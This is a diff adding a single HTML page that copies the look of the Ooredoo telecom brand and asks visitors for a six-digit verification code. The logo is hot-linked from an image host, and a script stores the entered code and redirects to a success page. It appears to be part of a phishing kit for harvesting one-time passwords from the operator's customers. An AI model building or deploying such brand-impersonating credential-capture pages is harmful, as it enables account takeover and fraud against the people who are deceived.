@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Verification - Ooredoo</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #D0191F;
+    --white: #FFFFFF;
+    --text: #1A1A1A;
+    --text-light: #808080;
+    --line: #D0D0D0;
+    --bg: #FAFAFA;
+    --maroon: #A01844;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body { 
+    font-family: 'Cairo', Tahoma, Arial, sans-serif; 
+    background: var(--bg); 
+    color: var(--text);
+    display: flex;
+    flex-direction: column;
+  }
+
+  .site-header {
+    position: sticky; top: 0; z-index: 100;
+    background: var(--white);
+    border-bottom: 1px solid var(--line);
+    padding-top: env(safe-area-inset-top, 0px);
+  }
+  .header-inner {
+    max-width: 1200px; margin: 0 auto;
+    height: 68px; padding: 0 16px;
+    display: flex; align-items: center; justify-content: space-between;
+  }
+  
+  .logo-placeholder {
+    display: flex;
+    align-items: center;
+    height: 56px;
+    width: auto;
+  }
+  
+  .ooredoo-logo {
+    height: 56px;
+    width: auto;
+    object-fit: contain;
+  }
+  .header-actions { display: flex; align-items: center; gap: 12px; }
+
+  .lang-toggle {
+    display: flex; background: #fff;
+    border: 2px solid var(--red); border-radius: 999px;
+    padding: 2px; cursor: pointer; font-family: inherit;
+  }
+  .lang-toggle span {
+    padding: 4px 12px; border-radius: 999px;
+    font-size: .85rem; font-weight: 600; color: var(--red);
+    transition: background .2s, color .2s;
+  }
+  .lang-toggle span.active { background: var(--red); color: #fff; }
+
+  .menu-btn {
+    width: 44px; height: 44px; background: none; border: none; cursor: pointer;
+    display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 6px;
+    border-radius: 8px;
+  }
+  .menu-btn span {
+    display: block; width: 26px; height: 3px; border-radius: 2px;
+    background: var(--red); transition: transform .25s, opacity .25s;
+  }
+  .menu-btn.open span:nth-child(1) { transform: translateY(9px) rotate(45deg); }
+  .menu-btn.open span:nth-child(2) { opacity: 0; }
+  .menu-btn.open span:nth-child(3) { transform: translateY(-9px) rotate(-45deg); }
+
+  .nav-menu { display: none; background: #fff; border-top: 1px solid var(--line); }
+  .nav-menu.open { display: block; }
+  .nav-menu a {
+    display: block; padding: 14px 20px; color: var(--text);
+    text-decoration: none; font-weight: 600; border-bottom: 1px solid var(--line);
+  }
+  .nav-menu a:hover { color: var(--red); background: #FFF5F5; }
+
+  .container {
+    flex: 1; max-width: 1200px; width: 100%; margin: 0 auto;
+    padding: 60px 24px; padding-bottom: max(40px, env(safe-area-inset-bottom, 0px));
+  }
+
+  .verification-container { 
+    background: var(--white); 
+    border-radius: 14px; 
+    padding: 40px 24px;
+    text-align: center;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+  }
+
+  .error-alert {
+    display: none;
+    background: #FEE;
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 24px;
+    align-items: center;
+    gap: 12px;
+    animation: slideDown 0.3s ease-out;
+  }
+
+  .error-alert.show {
+    display: flex;
+  }
+
+  .error-alert-close {
+    background: none;
+    border: none;
+    color: var(--red);
+    font-size: 1.5rem;
+    cursor: pointer;
+    padding: 0;
+    width: 24px;
+    height: 24px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+
+  .error-alert-text {
+    color: var(--red);
+    font-weight: 600;
+    flex: 1;
+    font-size: 0.95rem;
+  }
+
+  .security-icon {
+    width: 120px;
+    height: 120px;
+    margin: 0 auto 32px;
+    animation: slideIn 0.6s ease-out;
+  }
+
+  .security-icon img {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    display: block;
+  }
+
+  @keyframes slideIn {
+    from {
+      opacity: 0;
+      transform: translateY(-20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .verification-container h2 {
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 8px;
+  }
+
+  .verification-container p {
+    color: var(--text-light);
+    font-size: 0.95rem;
+    margin-bottom: 32px;
+    line-height: 1.5;
+  }
+
+  .otp-inputs {
+    display: flex;
+    gap: 10px;
+    justify-content: center;
+    margin-bottom: 24px;
+  }
+
+  .otp-input {
+    width: 48px;
+    height: 48px;
+    border: 2px solid var(--line);
+    border-radius: 8px;
+    text-align: center;
+    font-size: 1.5rem;
+    font-weight: 700;
+    font-family: 'Cairo', Tahoma, Arial, sans-serif;
+    color: var(--text);
+    background: var(--white);
+    cursor: text;
+    transition: border-color .2s, box-shadow .2s;
+  }
+
+  .otp-input:focus {
+    outline: none;
+    border-color: var(--red);
+    box-shadow: 0 0 0 2px rgba(208, 25, 31, 0.08);
+  }
+
+  .otp-input::placeholder {
+    color: var(--text-light);
+  }
+
+  .verify-btn {
+    background: var(--red);
+    color: white;
+    border: none;
+    border-radius: 999px;
+    padding: 16px 32px;
+    font-family: inherit;
+    font-size: 1rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: background .2s;
+    width: 100%;
+    max-width: 300px;
+  }
+
+  .verify-btn:hover { background: #B3161C; }
+  .verify-btn:disabled {
+    background: #BDBDBD;
+    cursor: not-allowed;
+  }
+
+  @media (max-width: 480px) {
+    .container { padding: 48px 20px; }
+    .verification-container { padding: 32px 16px; }
+    .verification-container h2 { font-size: 1.2rem; }
+    .security-icon { width: 100px; height: 100px; margin-bottom: 24px; }
+    .otp-inputs { gap: 8px; }
+    .otp-input { width: 44px; height: 44px; font-size: 1.3rem; }
+  }
+
+  @keyframes slideDown {
+    from {
+      opacity: 0;
+      transform: translateY(-10px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="header-inner">
+    <div class="logo-placeholder">
+      <img src="https://i.ibb.co/1JJbfqh8/ooredoo-logo-png-seeklogo-446266.png" alt="Ooredoo" class="ooredoo-logo">
+    </div>
+    <div class="header-actions">
+      <button class="lang-toggle" id="langToggle" aria-label="Change Language">
+        <span class="active" data-lang="ar">AR</span>
+      </button>
+      <button class="menu-btn" id="menuBtn" aria-label="Menu" aria-expanded="false" aria-controls="navMenu">
+        <span></span><span></span><span></span>
+      </button>
+    </div>
+  </div>
+  <nav class="nav-menu" id="navMenu">
+    <a href="#">Home</a>
+    <a href="#">Products</a>
+    <a href="#">About Us</a>
+    <a href="#">Contact Us</a>
+  </nav>
+</header>
+
+<main class="container">
+  <div class="verification-container">
+    <div class="error-alert" id="errorAlert">
+      <span class="error-alert-text" id="errorText">Invalid or expired OTP code</span>
+      <button class="error-alert-close" id="errorClose" aria-label="Close Alert">✕</button>
+    </div>
+
+    <div class="security-icon">
+      <img src="icon-security.png" alt="Security icon">
+    </div>
+
+    <h2>Enter Verification Code</h2>
+    <p>We sent a verification code to your registered phone number</p>
+    
+    <form id="otpForm">
+      <div class="otp-inputs" id="otpInputs">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 1">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 2">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 3">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 4">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 5">
+        <input type="text" class="otp-input" maxlength="1" inputmode="numeric" placeholder="0" aria-label="Digit 6">
+      </div>
+      
+      <button type="submit" class="verify-btn" id="verifyBtn" disabled>Verify Code</button>
+    </form>
+  </div>
+</main>
+
+<script>
+  const menuBtn = document.getElementById('menuBtn');
+  const navMenu = document.getElementById('navMenu');
+  menuBtn.addEventListener('click', () => {
+    const open = menuBtn.classList.toggle('open');
+    navMenu.classList.toggle('open', open);
+    menuBtn.setAttribute('aria-expanded', open);
+  });
+
+  const langToggle = document.getElementById('langToggle');
+  langToggle.addEventListener('click', () => {
+    window.location.href = 'otp_ooredoo.html';
+  });
+
+  const otpInputs = document.querySelectorAll('.otp-input');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const otpForm = document.getElementById('otpForm');
+  const errorAlert = document.getElementById('errorAlert');
+  const errorClose = document.getElementById('errorClose');
+
+  // Show error message from sessionStorage if exists
+  window.addEventListener('load', () => {
+    const otpError = sessionStorage.getItem('otpError');
+    if (otpError) {
+      errorAlert.classList.add('show');
+      sessionStorage.removeItem('otpError');
+    }
+  });
+
+  // Close error alert
+  errorClose.addEventListener('click', () => {
+    errorAlert.classList.remove('show');
+  });
+
+  otpInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+      if (!/^\d*$/.test(input.value)) {
+        input.value = '';
+        return;
+      }
+
+      if (input.value && index < otpInputs.length - 1) {
+        otpInputs[index + 1].focus();
+      }
+
+      const allFilled = Array.from(otpInputs).every(inp => inp.value !== '');
+      verifyBtn.disabled = !allFilled;
+    });
+
+    input.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        otpInputs[index - 1].focus();
+      }
+    });
+
+    input.addEventListener('keypress', (e) => {
+      if (!/\d/.test(e.key)) {
+        e.preventDefault();
+      }
+    });
+  });
+
+  otpForm.addEventListener('submit', (e) => {
+    e.preventDefault();
+    const otp = Array.from(otpInputs).map(inp => inp.value).join('');
+    
+    if (otp.length === 6) {
+      sessionStorage.setItem('otpCode', otp);
+      window.location.href = 'success-en.html';
+    }
+  });
+</script>
+
+</body>
+</html>
